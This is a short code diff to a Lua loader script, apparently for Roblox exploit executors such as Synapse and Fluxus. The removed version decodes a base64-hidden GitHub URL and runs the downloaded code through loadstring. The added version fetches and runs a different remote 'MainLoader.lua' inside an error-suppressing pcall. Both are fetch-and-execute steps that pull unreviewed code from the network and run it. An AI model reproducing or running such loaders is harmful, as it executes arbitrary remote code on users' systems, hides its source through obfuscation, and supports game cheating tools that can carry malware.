@@ -1,11 +1,4 @@
-local s = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05QQ29uVG9wL0NoYW9zLUh1Yi9yZWZzL2hlYWRzL21haW4vQ2hhb3NMb2FkZXJTY3JpcHQ="
-local b = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
-if b then
-    local url = game:GetService("HttpService"):Base64Decode(s)
-    local res = b({Url = url, Method = "GET"})
-    if res and res.Body then
-        loadstring(res.Body)()
-    end
-else
-    loadstring(game:HttpGet(game:GetService("HttpService"):Base64Decode(s)))()
-end
+pcall(function()
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
+end)
